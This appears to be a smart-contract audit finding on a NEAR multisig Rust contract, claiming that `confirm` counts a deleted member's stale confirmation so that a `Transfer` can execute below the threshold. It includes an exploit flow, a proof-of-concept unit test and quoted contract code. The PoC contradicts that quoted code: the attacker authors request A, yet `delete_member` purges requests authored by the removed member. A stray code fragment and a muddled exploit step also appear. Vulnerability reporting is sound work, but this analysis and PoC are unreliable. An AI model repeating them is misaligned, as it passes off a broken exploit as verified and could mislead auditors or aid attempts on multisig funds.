### Title
Multisig `confirm` counts stale confirmations from a member removed by `DeleteMember`, allowing request execution below `num_confirmations` live members - ([File: multisig2/src/lib.rs])

### Summary
`MultiSigContract::confirm` only checks `confirmations.len() as u32 + 1 >= self.num_confirmations` against the raw confirmation-set size, without verifying that every entry in that set still belongs to `self.members`. `delete_member` only purges pending requests and `num_requests_pk` entries *originated* by the removed member; it never scans other requests' `confirmations` sets to strip out the removed member's stale vote. This lets a request execute with fewer live confirming members than `num_confirmations`.

### Finding Description
The invariant that should hold at execution time is:
`|{m ∈ self.members : m.to_string() ∈ confirmations[request_id]}| == num_confirmations`

The actual code only enforces `confirmations[request_id].len() + 1 >= num_confirmations` in [1](#0-0) , with no cross-check against current `self.members` membership.

`delete_member` removes the target from `self.members` and clears only requests it authored (`r.member == member`), leaving any confirmation entries it left on *other* pending requests untouched: [2](#0-1) .

Exploit flow with `num_confirmations=3`, 4 members (attacker + 3 others):
1. Any member adds request A (e.g. `Transfer`) via `add_request`, creating an empty confirmation set: [3](#0-2) .
2. Attacker calls `confirm(A)` — since `0+1 < 3`, the vote is just stored: `confirmations[A] = {attacker}` (len=1).
3. A separate `DeleteMember{member: attacker}` request is added and confirmed to threshold by the 3 non-attacker members. `delete_member` asserts `members.len()-1 >= num_confirmations` (4-1=3≥3, passes), removes attacker from `self.members`, but does not touch `confirmations[A]`.
4. The remaining 2 live members (in addition to whichever member already confirmed as part of the delete flow, or two fresh confirmations) call `confirm(A)`. Once `confirmations[A].len()+1 >= 3`, `execute_request` fires, scheduling the `Transfer` promise.
5. At execution time, `confirmations[A]` still contains the attacker's serialized identity even though `self.members.contains(attacker) == false`. Only 2 currently-valid members' votes are behind the executed transfer, while `num_confirmations == 3`.

No existing guard (`assert_valid_request`, `assert_self_request`, `current_member`) revalidates historical confirmation-set membership against the live `self.members` set — `assert_valid_request` at [4](#0-3)  only validates the caller of the current call, not the stored set.

### Impact Explanation
A `Transfer` (or any other) request against the multisig account executes with a live-confirmation count below the configured `num_confirmations` threshold, i.e. the multisig's core security guarantee (k-of-n live signers) is broken. Since `Transfer` moves NEAR out of the multisig account to an attacker-controlled or arbitrary receiver, this matches the Critical category "a multisig request executed below `num_confirmations` live members." It is repeatable for any request the attacker confirms before being removed, as long as the attacker can get itself removed (or is removed by unrelated legitimate governance action) after confirming.

### Likelihood Explanation
Requires the attacker to be a legitimate `MultisigMember::Account` at some point (per the question's stated attacker model) and requires other members to independently execute a `DeleteMember` action removing the attacker while request A is still pending with the attacker's stale confirmation. This is a normal, unprivileged sequence of calls (`add_request`, `confirm`, no special deposit or gas needed), and the attacker's cost is just being confirmed once before removal — fully reproducible in a unit test using `testing_env!` context switches.

### Recommendation
In `confirm` (and/or `execute_request`), before counting/using `confirmations[request_id]`, filter the stored confirmation set to only those entries still present in `self.members` (or proactively prune confirmations from all other requests when a member is deleted, similar to how `delete_member` already prunes the deleted member's own authored requests). Re-validate the intersection size against `num_confirmations` at execution time rather than trusting the raw set length.

### Proof of Concept
```rust
#[test]
fn stale_confirmation_counted_after_member_removed() {
    // members: alice(Account), bob(Account), key3(AccessKey), key4(AccessKey/attacker)
    // num_confirmations = 3
    let mut c = MultiSigContract::new(members(), 3);

    // 1) attacker (key4) adds & confirms request A (Transfer)
    testing_env!(context_with_key(attacker_key(), amount));
    let request_a = c.add_request(MultiSigRequest {
        receiver_id: bob(),
        actions: vec![MultiSigRequestAction::Transfer { amount: amount.into() }],
    });
    c.confirm(request_a);
    assert_eq!(c.confirmations.get(&request_a).unwrap().len(), 1);

    // 2) 3 other members add+confirm DeleteMember{attacker} to threshold
    testing_env!(context_with_account(alice(), amount));
    let del_req = c.add_request(MultiSigRequest {
        receiver_id: alice(), // == current_account_id in tests
        actions: vec![MultiSigRequestAction::DeleteMember {
            member: MultisigMember::AccessKey { public_key: attacker_key() },
        }],
    });
    c.confirm(del_req); // 1
    testing_env!(context_with_account(bob(), amount));
    c.confirm(del_req); // 2
    testing_env!(context_with_key(key3(), amount));
    c.confirm(del_req); // 3 -> triggers execute_request -> delete_member removes attacker

    assert!(!c.members.contains(&MultisigMember::AccessKey { public_key: attacker_key() }));

    // confirmations[A] still contains attacker's stale entry
    assert_eq!(c.confirmations.get(&request_a).unwrap().len(), 1);

    // 3) two remaining live members confirm A -> reaches threshold and executes
    testing_env!(context_with_account(alice(), amount));
    c.confirm(request_a); // len 1 -> 2
    testing_env!(context_with_account(bob(), amount));
    c.confirm(request_a); // len+1 == 3 -> executes Transfer

    // BINDING VIOLATION:
    // live confirming members = {alice, bob} = 2, but num_confirmations = 3
    // request A executed with only 2 live confirmations, attacker's stale vote counted as the 3rd
}
```

```rust
    }
```

```rust
    pub fn confirm(&mut self, request_id: RequestId) -> PromiseOrValue<bool> {
        self.assert_valid_request(request_id);
        let member = self
            .current_member()
            .unwrap_or_else(|| env::panic_str("Must be validated above"));
        let mut confirmations = self.confirmations.get(&request_id).unwrap();
        assert(
            !confirmations.contains(&member.to_string()),
            "Already confirmed this request with this key",
        );
        if confirmations.len() as u32 + 1 >= self.num_confirmations {
            let request = self.remove_request(request_id);
            /********************************
            NOTE: If the tx execution fails for any reason, the request and confirmations are removed already, so the client has to start all over
            ********************************/
            self.execute_request(request)
        } else {
            confirmations.insert(member.to_string());
            self.confirmations.insert(&request_id, &confirmations);
            PromiseOrValue::Value(true)
        }
    }
```

```rust
    fn delete_member(&mut self, promise: Promise, member: MultisigMember) -> Promise {
        assert(
            self.members.len() - 1 >= self.num_confirmations as u64,
            "Removing given member will make total number of members below number of confirmations",
        );
        // delete outstanding requests by public_key
        let request_ids: Vec<u32> = self
            .requests
            .iter()
            .filter_map(|(k, r)| if r.member == member { Some(k) } else { None })
            .collect();
        for request_id in request_ids {
            // remove confirmations for this request
            self.confirmations.remove(&request_id);
            self.requests.remove(&request_id);
        }
        // remove num_requests_pk entry for member
        self.num_requests_pk.remove(&member.to_string());
        self.members.remove(&member);
        match member {
            MultisigMember::AccessKey { public_key } => promise.delete_key(public_key.into()),
            MultisigMember::Account { account_id: _ } => promise,
        }
    }
```
